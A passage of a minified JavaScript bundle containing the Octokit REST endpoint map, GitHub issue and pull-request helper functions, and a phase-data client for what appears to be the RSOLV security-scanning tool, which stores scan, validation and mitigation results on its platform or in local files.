/repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],removeCollaborator:["DELETE /repos/{owner}/{repo}/collaborators/{username}"],removeStatusCheckContexts:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],removeStatusCheckProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],removeTeamAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],removeUserAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],renameBranch:["POST /repos/{owner}/{repo}/branches/{branch}/rename"],replaceAllTopics:["PUT /repos/{owner}/{repo}/topics"],requestPagesBuild:["POST /repos/{owner}/{repo}/pages/builds"],setAdminBranchProtection:["POST /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],setAppAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],setStatusCheckContexts:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],setTeamAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],setUserAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],testPushWebhook:["POST /repos/{owner}/{repo}/hooks/{hook_id}/tests"],transfer:["POST /repos/{owner}/{repo}/transfer"],update:["PATCH /repos/{owner}/{repo}"],updateBranchProtection:["PUT /repos/{owner}/{repo}/branches/{branch}/protection"],updateCommitComment:["PATCH /repos/{owner}/{repo}/comments/{comment_id}"],updateDeploymentBranchPolicy:["PUT /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],updateInformationAboutPagesSite:["PUT /repos/{owner}/{repo}/pages"],updateInvitation:["PATCH /repos/{owner}/{repo}/invitations/{invitation_id}"],updateOrgRuleset:["PUT /orgs/{org}/rulesets/{ruleset_id}"],updatePullRequestReviewProtection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],updateRelease:["PATCH /repos/{owner}/{repo}/releases/{release_id}"],updateReleaseAsset:["PATCH /repos/{owner}/{repo}/releases/assets/{asset_id}"],updateRepoRuleset:["PUT /repos/{owner}/{repo}/rulesets/{ruleset_id}"],updateStatusCheckPotection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks",{},{renamed:["repos","updateStatusCheckProtection"]}],updateStatusCheckProtection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],updateWebhook:["PATCH /repos/{owner}/{repo}/hooks/{hook_id}"],updateWebhookConfigForRepo:["PATCH /repos/{owner}/{repo}/hooks/{hook_id}/config"],uploadReleaseAsset:["POST /repos/{owner}/{repo}/releases/{release_id}/assets{?name,label}",{baseUrl:"https://uploads.github.com"}]},search:{code:["GET /search/code"],commits:["GET /search/commits"],issuesAndPullRequests:["GET /search/issues",{},{deprecated:"octokit.rest.search.issuesAndPullRequests() is deprecated, see https://docs.github.com/rest/search/search#search-issues-and-pull-requests"}],labels:["GET /search/labels"],repos:["GET /search/repositories"],topics:["GET /search/topics"],users:["GET /search/users"]},secretScanning:{createPushProtectionBypass:["POST /repos/{owner}/{repo}/secret-scanning/push-protection-bypasses"],getAlert:["GET /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}"],getScanHistory:["GET /repos/{owner}/{repo}/secret-scanning/scan-history"],listAlertsForEnterprise:["GET /enterprises/{enterprise}/secret-scanning/alerts"],listAlertsForOrg:["GET /orgs/{org}/secret-scanning/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/secret-scanning/alerts"],listLocationsForAlert:["GET /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}/locations"],updateAlert:["PATCH /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}"]},securityAdvisories:{createFork:["POST /repos/{owner}/{repo}/security-advisories/{ghsa_id}/forks"],createPrivateVulnerabilityReport:["POST /repos/{owner}/{repo}/security-advisories/reports"],createRepositoryAdvisory:["POST /repos/{owner}/{repo}/security-advisories"],createRepositoryAdvisoryCveRequest:["POST /repos/{owner}/{repo}/security-advisories/{ghsa_id}/cve"],getGlobalAdvisory:["GET /advisories/{ghsa_id}"],getRepositoryAdvisory:["GET /repos/{owner}/{repo}/security-advisories/{ghsa_id}"],listGlobalAdvisories:["GET /advisories"],listOrgRepositoryAdvisories:["GET /orgs/{org}/security-advisories"],listRepositoryAdvisories:["GET /repos/{owner}/{repo}/security-advisories"],updateRepositoryAdvisory:["PATCH /repos/{owner}/{repo}/security-advisories/{ghsa_id}"]},teams:{addOrUpdateMembershipForUserInOrg:["PUT /orgs/{org}/teams/{team_slug}/memberships/{username}"],addOrUpdateProjectPermissionsInOrg:["PUT /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.addOrUpdateProjectPermissionsInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#add-or-update-team-project-permissions"}],addOrUpdateProjectPermissionsLegacy:["PUT /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.addOrUpdateProjectPermissionsLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#add-or-update-team-project-permissions-legacy"}],addOrUpdateRepoPermissionsInOrg:["PUT /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],checkPermissionsForProjectInOrg:["GET /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.checkPermissionsForProjectInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#check-team-permissions-for-a-project"}],checkPermissionsForProjectLegacy:["GET /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.checkPermissionsForProjectLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#check-team-permissions-for-a-project-legacy"}],checkPermissionsForRepoInOrg:["GET /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],create:["POST /orgs/{org}/teams"],createDiscussionCommentInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments"],createDiscussionInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions"],deleteDiscussionCommentInOrg:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],deleteDiscussionInOrg:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],deleteInOrg:["DELETE /orgs/{org}/teams/{team_slug}"],getByName:["GET /orgs/{org}/teams/{team_slug}"],getDiscussionCommentInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],getDiscussionInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],getMembershipForUserInOrg:["GET /orgs/{org}/teams/{team_slug}/memberships/{username}"],list:["GET /orgs/{org}/teams"],listChildInOrg:["GET /orgs/{org}/teams/{team_slug}/teams"],listDiscussionCommentsInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments"],listDiscussionsInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions"],listForAuthenticatedUser:["GET /user/teams"],listMembersInOrg:["GET /orgs/{org}/teams/{team_slug}/members"],listPendingInvitationsInOrg:["GET /orgs/{org}/teams/{team_slug}/invitations"],listProjectsInOrg:["GET /orgs/{org}/teams/{team_slug}/projects",{},{deprecated:"octokit.rest.teams.listProjectsInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#list-team-projects"}],listProjectsLegacy:["GET /teams/{team_id}/projects",{},{deprecated:"octokit.rest.teams.listProjectsLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#list-team-projects-legacy"}],listReposInOrg:["GET /orgs/{org}/teams/{team_slug}/repos"],removeMembershipForUserInOrg:["DELETE /orgs/{org}/teams/{team_slug}/memberships/{username}"],removeProjectInOrg:["DELETE /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.removeProjectInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#remove-a-project-from-a-team"}],removeProjectLegacy:["DELETE /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.removeProjectLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#remove-a-project-from-a-team-legacy"}],removeRepoInOrg:["DELETE /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],updateDiscussionCommentInOrg:["PATCH /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],updateDiscussionInOrg:["PATCH /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],updateInOrg:["PATCH /orgs/{org}/teams/{team_slug}"]},users:{addEmailForAuthenticated:["POST /user/emails",{},{renamed:["users","addEmailForAuthenticatedUser"]}],addEmailForAuthenticatedUser:["POST /user/emails"],addSocialAccountForAuthenticatedUser:["POST /user/social_accounts"],block:["PUT /user/blocks/{username}"],checkBlocked:["GET /user/blocks/{username}"],checkFollowingForUser:["GET /users/{username}/following/{target_user}"],checkPersonIsFollowedByAuthenticated:["GET /user/following/{username}"],createGpgKeyForAuthenticated:["POST /user/gpg_keys",{},{renamed:["users","createGpgKeyForAuthenticatedUser"]}],createGpgKeyForAuthenticatedUser:["POST /user/gpg_keys"],createPublicSshKeyForAuthenticated:["POST /user/keys",{},{renamed:["users","createPublicSshKeyForAuthenticatedUser"]}],createPublicSshKeyForAuthenticatedUser:["POST /user/keys"],createSshSigningKeyForAuthenticatedUser:["POST /user/ssh_signing_keys"],deleteEmailForAuthenticated:["DELETE /user/emails",{},{renamed:["users","deleteEmailForAuthenticatedUser"]}],deleteEmailForAuthenticatedUser:["DELETE /user/emails"],deleteGpgKeyForAuthenticated:["DELETE /user/gpg_keys/{gpg_key_id}",{},{renamed:["users","deleteGpgKeyForAuthenticatedUser"]}],deleteGpgKeyForAuthenticatedUser:["DELETE /user/gpg_keys/{gpg_key_id}"],deletePublicSshKeyForAuthenticated:["DELETE /user/keys/{key_id}",{},{renamed:["users","deletePublicSshKeyForAuthenticatedUser"]}],deletePublicSshKeyForAuthenticatedUser:["DELETE /user/keys/{key_id}"],deleteSocialAccountForAuthenticatedUser:["DELETE /user/social_accounts"],deleteSshSigningKeyForAuthenticatedUser:["DELETE /user/ssh_signing_keys/{ssh_signing_key_id}"],follow:["PUT /user/following/{username}"],getAuthenticated:["GET /user"],getById:["GET /user/{account_id}"],getByUsername:["GET /users/{username}"],getContextForUser:["GET /users/{username}/hovercard"],getGpgKeyForAuthenticated:["GET /user/gpg_keys/{gpg_key_id}",{},{renamed:["users","getGpgKeyForAuthenticatedUser"]}],getGpgKeyForAuthenticatedUser:["GET /user/gpg_keys/{gpg_key_id}"],getPublicSshKeyForAuthenticated:["GET /user/keys/{key_id}",{},{renamed:["users","getPublicSshKeyForAuthenticatedUser"]}],getPublicSshKeyForAuthenticatedUser:["GET /user/keys/{key_id}"],getSshSigningKeyForAuthenticatedUser:["GET /user/ssh_signing_keys/{ssh_signing_key_id}"],list:["GET /users"],listAttestations:["GET /users/{username}/attestations/{subject_digest}"],listBlockedByAuthenticated:["GET /user/blocks",{},{renamed:["users","listBlockedByAuthenticatedUser"]}],listBlockedByAuthenticatedUser:["GET /user/blocks"],listEmailsForAuthenticated:["GET /user/emails",{},{renamed:["users","listEmailsForAuthenticatedUser"]}],listEmailsForAuthenticatedUser:["GET /user/emails"],listFollowedByAuthenticated:["GET /user/following",{},{renamed:["users","listFollowedByAuthenticatedUser"]}],listFollowedByAuthenticatedUser:["GET /user/following"],listFollowersForAuthenticatedUser:["GET /user/followers"],listFollowersForUser:["GET /users/{username}/followers"],listFollowingForUser:["GET /users/{username}/following"],listGpgKeysForAuthenticated:["GET /user/gpg_keys",{},{renamed:["users","listGpgKeysForAuthenticatedUser"]}],listGpgKeysForAuthenticatedUser:["GET /user/gpg_keys"],listGpgKeysForUser:["GET /users/{username}/gpg_keys"],listPublicEmailsForAuthenticated:["GET /user/public_emails",{},{renamed:["users","listPublicEmailsForAuthenticatedUser"]}],listPublicEmailsForAuthenticatedUser:["GET /user/public_emails"],listPublicKeysForUser:["GET /users/{username}/keys"],listPublicSshKeysForAuthenticated:["GET /user/keys",{},{renamed:["users","listPublicSshKeysForAuthenticatedUser"]}],listPublicSshKeysForAuthenticatedUser:["GET /user/keys"],listSocialAccountsForAuthenticatedUser:["GET /user/social_accounts"],listSocialAccountsForUser:["GET /users/{username}/social_accounts"],listSshSigningKeysForAuthenticatedUser:["GET /user/ssh_signing_keys"],listSshSigningKeysForUser:["GET /users/{username}/ssh_signing_keys"],setPrimaryEmailVisibilityForAuthenticated:["PATCH /user/email/visibility",{},{renamed:["users","setPrimaryEmailVisibilityForAuthenticatedUser"]}],setPrimaryEmailVisibilityForAuthenticatedUser:["PATCH /user/email/visibility"],unblock:["DELETE /user/blocks/{username}"],unfollow:["DELETE /user/following/{username}"],updateAuthenticated:["PATCH /user"]}},LB=ek});function QH(X){let Q={};for(let J of cX.keys())Q[J]=new Proxy({octokit:X,scope:J,cache:{}},Xb);return Q}function Qb(X,Q,J,Y,W){let G=X.request.defaults(Y);function H(...$){let z=G.endpoint.merge(...$);if(W.mapToData)return z=Object.assign({},z,{data:z[W.mapToData],[W.mapToData]:void 0}),G(z);if(W.renamed){let[U,K]=W.renamed;X.log.warn(`octokit.${Q}.${J}() has been renamed to octokit.${U}.${K}()`)}if(W.deprecated)X.log.warn(W.deprecated);if(W.renamedParameters){let U=G.endpoint.merge(...$);for(let[K,B]of Object.entries(W.renamedParameters))if(K in U){if(X.log.warn(`"${K}" parameter is deprecated for "octokit.${Q}.${J}()". Use "${B}" instead`),!(B in U))U[B]=U[K];delete U[K]}return G(U)}return G(...$)}return Object.assign(H,G)}var cX,Xb;var NB=$1(()=>{DB();cX=new Map;for(let[X,Q]of Object.entries(LB))for(let[J,Y]of Object.entries(Q)){let[W,G,H]=Y,[$,z]=W.split(/ /),U=Object.assign({method:$,url:z},G);if(!cX.has(X))cX.set(X,new Map);cX.get(X).set(J,{scope:X,methodName:J,endpointDefaults:U,decorations:H})}Xb={has({scope:X},Q){return cX.get(X).has(Q)},getOwnPropertyDescriptor(X,Q){return{value:this.get(X,Q),configurable:!0,writable:!0,enumerable:!0}},defineProperty(X,Q,J){return Object.defineProperty(X.cache,Q,J),!0},deleteProperty(X,Q){return delete X.cache[Q],!0},ownKeys({scope:X}){return[...cX.get(X).keys()]},set(X,Q,J){return X.cache[Q]=J},get({octokit:X,scope:Q,cache:J},Y){if(J[Y])return J[Y];let W=cX.get(Q).get(Y);if(!W)return;let{endpointDefaults:G,decorations:H}=W;if(H)J[Y]=Qb(X,Q,Y,G,H);else J[Y]=X.request.defaults(G);return J[Y]}}});function Jb(X){return{rest:QH(X)}}function JH(X){let Q=QH(X);return{...Q,rest:Q}}var wB=$1(()=>{RB();NB();Jb.VERSION=XH;JH.VERSION=XH});var IB="21.1.1";var CB=()=>{};var TJ;var YH=$1(()=>{qB();jB();AB();wB();CB();TJ=oG.plugin(sG,JH,eG).defaults({userAgent:`octokit-rest.js/${IB}`})});var r7={};Y9(r7,{updateIssue:()=>zb,removeLabel:()=>Kb,getRepositoryDetails:()=>A4,getIssue:()=>Yb,getGitHubClient:()=>v0,createPullRequest:()=>$b,createOrUpdateFile:()=>Gb,createIssueComment:()=>Wb,createBranch:()=>Hb,addLabels:()=>Ub});function v0(X){if(_J)return _J;let Q=X?.repoToken||process.env.GITHUB_TOKEN;if(!Q)throw V.error("No GitHub token found"),Error("No GitHub token found. Please set GITHUB_TOKEN environment variable or provide repoToken in config.");return _J=new TJ({auth:Q,timeZone:"UTC"}),V.debug("GitHub API client created"),_J}async function A4(X,Q){try{let J=v0(),{data:Y}=await J.repos.get({owner:X,repo:Q});return{id:Y.id,name:Y.name,fullName:Y.full_name,owner:Y.owner.login,defaultBranch:Y.default_branch,language:Y.language,private:Y.private}}catch(J){throw V.error(`Error getting repository details for ${X}/${Q}`,J),Error(`Failed to get repository details: ${J instanceof Error?J.message:String(J)}`)}}async function Yb(X,Q,J){try{let Y=v0(),{data:W}=await Y.issues.get({owner:X,repo:Q,issue_number:J});return{id:W.id.toString(),number:W.number,title:W.title,body:W.body||"",labels:W.labels.map((G)=>typeof G==="string"?G:G.name||""),assignees:W.assignees?.map((G)=>G.login)||[],repository:{owner:X,name:Q,fullName:`${X}/${Q}`,defaultBranch:"main"},source:"github",createdAt:W.created_at,updatedAt:W.updated_at,metadata:{state:W.state,user:W.user?.login}}}catch(Y){return V.error(`Error getting issue #${J} from ${X}/${Q}`,Y),null}}async function Wb(X,Q,J,Y){try{await v0().issues.createComment({owner:X,repo:Q,issue_number:J,body:Y}),V.info(`Comment created on issue #${J}`)}catch(W){throw V.error(`Error creating comment on issue #${J}`,W),Error(`Failed to create issue comment: ${W instanceof Error?W.message:String(W)}`)}}async function Gb(X,Q,J,Y,W,G){try{let H=v0(),$;try{let{data:z}=await H.repos.getContent({owner:X,repo:Q,path:J,ref:G});if(!Array.isArray(z))$=z.sha}catch(z){V.debug(`File ${J} doesn't exist, will create it`)}await H.repos.createOrUpdateFileContents({owner:X,repo:Q,path:J,message:W,content:Buffer.from(Y).toString("base64"),branch:G,sha:$}),V.info(`File ${J} created or updated on branch ${G}`)}catch(H){throw V.error(`Error creating or updating file ${J}`,H),Error(`Failed to create or update file: ${H instanceof Error?H.message:String(H)}`)}}async function Hb(X,Q,J,Y){try{let W=v0(),G=Y||"main",{data:H}=await W.git.getRef({owner:X,repo:Q,ref:`heads/${G}`});await W.git.createRef({owner:X,repo:Q,ref:`refs/heads/${J}`,sha:H.object.sha}),V.info(`Branch ${J} created from ${G}`)}catch(W){throw V.error(`Error creating branch ${J}`,W),Error(`Failed to create branch: ${W instanceof Error?W.message:String(W)}`)}}async function $b(X,Q,J,Y,W,G="main"){try{let H=v0(),{data:$}=await H.pulls.create({owner:X,repo:Q,title:J,body:Y,head:W,base:G});return V.info(`Pull request #${$.number} created: ${$.html_url}`),{number:$.number,html_url:$.html_url}}catch(H){throw V.error("Error creating pull request",H),Error(`Failed to create pull request: ${H instanceof Error?H.message:String(H)}`)}}async function zb(X,Q,J,Y){let W=`https://api.github.com/repos/${X}/${Q}/issues/${J}`,G=await fetch(W,{method:"PATCH",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"},body:JSON.stringify(Y)});if(!G.ok)throw Error(`Failed to update issue: ${G.statusText}`)}async function Ub(X,Q,J,Y){let W=`https://api.github.com/repos/${X}/${Q}/issues/${J}/labels`,G=await fetch(W,{method:"POST",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"},body:JSON.stringify({labels:Y})});if(!G.ok)throw Error(`Failed to add labels: ${G.statusText}`)}async function Kb(X,Q,J,Y){let W=`https://api.github.com/repos/${X}/${Q}/issues/${J}/labels/${encodeURIComponent(Y)}`,G=await fetch(W,{method:"DELETE",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json"}});if(!G.ok&&G.status!==404)throw Error(`Failed to remove label: ${G.statusText}`)}var _J=null;var g9=$1(()=>{YH();y1()});class R4{apiKey;baseUrl;headers;usePlatformStorage;constructor(X,Q=process.env.RSOLV_API_URL||"https://api.rsolv.dev"){this.apiKey=X;this.baseUrl=Q;this.headers=new Headers({"Content-Type":"application/json","X-API-Key":X}),this.usePlatformStorage=process.env.USE_PLATFORM_STORAGE!=="false"}async storePhaseResults(X,Q,J){if(!this.usePlatformStorage)return this.storeLocally(X,Q,J);let W={scan:"scan",validate:"validation",mitigate:"mitigation"}[X]||X,G;if(X==="scan")G=Q.scan;else if(X==="validate"||X==="mitigate"){let H=Q[X];if(!J.issueNumber)throw Error(`Issue number is required for ${X} phase`);if(!H)throw Error(`No ${X} data found for issue ${J.issueNumber}`);let $=String(J.issueNumber);if(G=H[$]||H[`issue-${$}`],!G)throw Error(`No ${X} data found for issue ${J.issueNumber}`)}try{let H={phase:W,data:G,...J},$=`${this.baseUrl}/api/v1/phases/store`;console.log("[PhaseDataClient] Storing phase data:",{url:$,phase:W,hasData:!!G,dataType:typeof G,repo:J.repo,issueNumber:J.issueNumber,commitSha:J.commitSha?.substring(0,8)}),console.log("[PhaseDataClient] Full request payload:",JSON.stringify(H,null,2));let z=await fetch($,{method:"POST",headers:this.headers,body:JSON.stringify(H)});if(!z.ok){let K=await z.text().catch(()=>"Unable to read error response"),B={};throw z.headers.forEach((q,Z)=>{B[Z]=q}),console.error("[PhaseDataClient] Platform storage failed:",{url:$,status:z.status,statusText:z.statusText,headers:B,errorBody:K}),Error(`Platform storage failed: ${z.status} ${z.statusText} - ${K}`)}let U=await z.json();return console.log("[PhaseDataClient] Platform storage succeeded:",{storage:"platform",id:U.id}),{...U,storage:"platform"}}catch(H){return console.error("[PhaseDataClient] Platform storage error, falling back to local:",{error:H instanceof Error?H.message:String(H),stack:H instanceof Error?H.stack:void 0,phase:X,repo:J.repo,issueNumber:J.issueNumber}),this.storeLocally(X,Q,J)}}async retrievePhaseResults(X,Q,J){if(!this.usePlatformStorage)return this.retrieveLocally(X,Q,J);try{let Y=`${this.baseUrl}/api/v1/phases/retrieve?repo=${encodeURIComponent(X)}&issue=${Q}&commit=${encodeURIComponent(J)}`;console.log("[PhaseDataClient] Retrieving phase data from platform:",{url:Y,repo:X,issueNumber:Q,commitSha:J.substring(0,8)});let W=await fetch(Y,{headers:this.headers});if(W.status===404)return console.log("[PhaseDataClient] Platform returned 404 (not found), falling back to local"),this.retrieveLocally(X,Q,J);if(!W.ok){let H=await W.text().catch(()=>"Unable to read error response");throw console.error("[PhaseDataClient] Platform retrieval failed:",{status:W.status,statusText:W.statusText,errorBody:H}),Error(`Platform retrieval failed: ${W.status} ${W.statusText} - ${H}`)}let G=await W.json();if(console.log("[PhaseDataClient] Retrieved from platform:",{hasValidation:!!G?.validation,hasValidate:!!G?.validate,hasScan:!!G?.scan,hasMitigation:!!G?.mitigation,keys:Object.keys(G||{}),validationKeys:G?.validation?Object.keys(G.validation):[],validateKeys:G?.validate?Object.keys(G.validate):[]}),G&&G.validation&&!G.validate)console.log("[PhaseDataClient] Mapping validation -> validate"),G.validate=G.validation,delete G.validation;if(G&&G.mitigation&&!G.mitigate)console.log("[PhaseDataClient] Mapping mitigation -> mitigate"),G.mitigate=G.mitigation,delete G.mitigation;return console.log("[PhaseDataClient] Returning data with keys:",Object.keys(G||{})),G}catch(Y){return console.error("[PhaseDataClient] Platform retrieval error, falling back to local:",{error:Y instanceof Error?Y.message:String(Y),stack:Y instanceof Error?Y.stack:void 0,repo:X,issueNumber:Q,commitSha:J.substring(0,8)}),this.retrieveLocally(X,Q,J)}}async validatePhaseTransition(X,Q,J){if(await this.getCurrentCommitSha()!==J)return!1;return{scan:["validate"],validate:["mitigate"],mitigate:[]}[X]?.includes(Q)??!1}async storeLocally(X,Q,J){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/phase-data";await Y.mkdir(".rsolv/phase-data",{recursive:!0});let H=`${J.repo.replace("/","-")}-${J.issueNumber||"scan"}-${X}.json`,$=W.join(".rsolv/phase-data",H);return await Y.writeFile($,JSON.stringify({phase:X,data:Q,metadata:J,timestamp:new Date().toISOString()},null,2)),{success:!0,storage:"local",warning:"Platform unavailable, stored locally"}}async retrieveLocally(X,Q,J){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/phase-data",$=`${X.replace("/","-")}-${Q}-`;console.log("[PhaseDataClient] Retrieving from local storage:",{dir:".rsolv/phase-data",pattern:$,repo:X,issueNumber:Q,commitSha:J.substring(0,8)});try{let z=await Y.readdir(".rsolv/phase-data"),U=z.filter((q)=>q.startsWith($));console.log("[PhaseDataClient] Local storage files found:",{totalFiles:z.length,matchingFiles:U,pattern:$});let K={};for(let q of U){let Z=await Y.readFile(W.join(".rsolv/phase-data",q),"utf-8"),M=JSON.parse(Z);if(console.log("[PhaseDataClient] Checking local file:",{file:q,storedCommitSha:M.metadata.commitSha?.substring(0,8),requestedCommitSha:J.substring(0,8),matches:M.metadata.commitSha===J,phase:M.phase,hasData:!!M.data}),M.metadata.commitSha===J)Object.assign(K,M.data)}let B=Object.keys(K).length>0?K:null;return console.log("[PhaseDataClient] Local retrieval result:",{found:!!B,keys:B?Object.keys(B):[]}),B}catch(z){return console.error("[PhaseDataClient] Local retrieval error:",{error:z instanceof Error?z.message:String(z),dir:".rsolv/phase-data",pattern:$}),null}}async getCurrentCommitSha(){if(process.env.GITHUB_SHA)return process.env.GITHUB_SHA.trim();try{let{execSync:X}=await import("child_process");return X("git rev-parse HEAD").toString().trim()}catch(X){return console.warn("[PhaseDataClient] Git not available, using fallback commit SHA"),"no-git-available"}}async getPhaseTestInfo(X){return{branchName:`rsolv/validate/${X}`,testPath:`__tests__/security/rsolv-${X}.test.js`,framework:"jest",command:`npm test -- __tests__/security/rsolv-${X}.test.js`}}async saveTestResults(X){console.log("[PhaseDataClient] Saving test results:",X)}async calculateTrustScore(X,Q){if(!X&&Q)return 100;else if(X&&Q)return 50;else return 0}async storeFailureDetails(X,Q,J){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/failures";await Y.mkdir(".rsolv/observability/failures",{recursive:!0});let H=`${X.replace("/","-")}-${Q}-failure-${Date.now()}.json`,$=W.join(".rsolv/observability/failures",H);await Y.writeFile($,JSON.stringify(J,null,2)),console.log(`[PhaseDataClient] Stored failure details: ${$}`)}async storeRetryAttempt(X,Q,J){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/retries";await Y.mkdir(".rsolv/observability/retries",{recursive:!0});let H=`${X.replace("/","-")}-${Q}-retry-${J.attemptNumber}.json`,$=W.join(".rsolv/observability/retries",H);await Y.writeFile($,JSON.stringify(J,null,2)),console.log(`[PhaseDataClient] Stored retry attempt ${J.attemptNumber}/${J.maxRetries}: ${$}`)}async storeTrustScore(X,Q,J){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/trust-scores";await Y.mkdir(".rsolv/observability/trust-scores",{recursive:!0});let H=`${X.replace("/","-")}-${Q}-trust-score.json`,$=W.join(".rsolv/observability/trust-scores",H);await Y.writeFile($,JSON.stringify(J,null,2)),console.log(`[PhaseDataClient] Stored trust score (${J.trustScore}): ${$}`)}async storeExecutionTimeline(X,Q,J){let Y=await import("fs/promises"),W=await import("path"),G=".rsolv/observability/timelines";await Y.mkdir(".rsolv/observability/timelines",{recursive:!0});let H=`${X.replace("/","-")}-${Q}-timeline.json`,$=W.join(".rsolv/observability/timelines",H);await Y.writeFile($,JSON.stringify(J,null,2)),console.log(`[PhaseDataClient] Stored execution timeline (${J.totalDurationMs}ms): ${$}`)}}var _B=m((TB)=>{Object.defineProperty(TB,"__esModule",{value:!0})});var bB=m((kB)=>{Object.defineProperty(kB,"__esModule",{value:!0});kB.types=void 0;var qb;(function(X){X[X.ROOT=0]="ROOT",X[X.GROUP=1]="GROUP",X[X.POSITION=2]="POSITION",X[X.SET=3]="SET",X[X.RANGE=4]="RANGE",X[X.REPETITION=5]="REPETITION",X[X.REFERENCE=6]="REFERENCE",X[X.CHAR=7]="CHAR"})(qb=kB.types||(kB.types={}))});var xB=m((vB)=>{Object.defineProperty(vB,"__esModule",{value:!0})});var R8=m((A8)=>{var Zb=A8&&A8.__createBinding||(Object.create?function(X,Q,J,Y){if(Y===void 0)Y=J;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return Q[J]}})}:function(X,Q,J,Y){if(Y===void 0)Y=J;X[Y]=Q[J]}),GH=A8&&A8.__exportStar||function(X,Q){for(var J in X)if(J!=="default"&&!Object.prototype.hasOwnProperty.call(Q,J))Zb(Q,X,J)};Object.defineProperty(A8,"__esModule",{value:!0});GH(_B(),A8);GH(bB(),A8);GH(xB(),A8)});var kJ=m((gB)=>{Object.defineProperty(gB,"__esModule",{value:!0});gB.anyChar=gB.notWhitespace=gB.whitespace=gB.notInts=gB.ints=gB.notWords=gB.words=void 0;var N0=R8(),fB=()=>[{type:N0.types.RANGE,from:48,to:57}],hB=()=>[{type:N0.types.CHAR,value:95},{type:N0.types.RANGE,from:97,to:122},{type:N0.types.RANGE,from:65,to:90},{type:N0.types.RANGE,from:48,to:57}],yB=()=>[{type:N0.types.CHAR,value:9},{type:N0.types.CHAR,value:10},{type:N0.types.CHAR,value:11},{type:N0.types.CHAR,value:12},{type:N0.types.CHAR,value:13},{type:N0.types.CHAR,value:32},{type:N0.types.CHAR,value:160},{type:N0.types.CHAR,value:5760},{type:N0.types.RANGE,from:8192,to:8202},{type:N0.types.CHAR,value:8232},{type:N0.types.CHAR,value:8233},{type:N0.types.CHAR,value:8239},{type:N0.types.CHAR,value:8287},{type:N0.types.CHAR,value:12288},{type:N0.types.CHAR,value:65279}],Mb=()=>[{type:N0.types.CHAR,value:10},{type:N0.types.CHAR,value:13},{type:N0.types.CHAR,value:8232},{type:N0.types.CHAR,value:8233}];gB.words=()=>({type:N0.types.SET,set:hB(),not:!1});gB.notWords=()=>({type:N0.types.SET,set:hB(),not:!0});gB.ints=()=>({type:N0.types.SET,set:fB(),not:!1});gB.notInts=()=>({type:N0.types.SET,set:fB(),not:!0});gB.whitespace=()=>({type:N0.types.SET,set:yB(),not:!1});gB.notWhitespace=()=>({type:N0.types.SET,set:yB(),not:!0});gB.anyChar=()=>({type:N0.types.SET,set:Mb(),not:!0})});var cB=m((Q6)=>{var Db=Q6&&Q6.__createBinding||(Object.create?function(X,Q,J,Y){if(Y===void 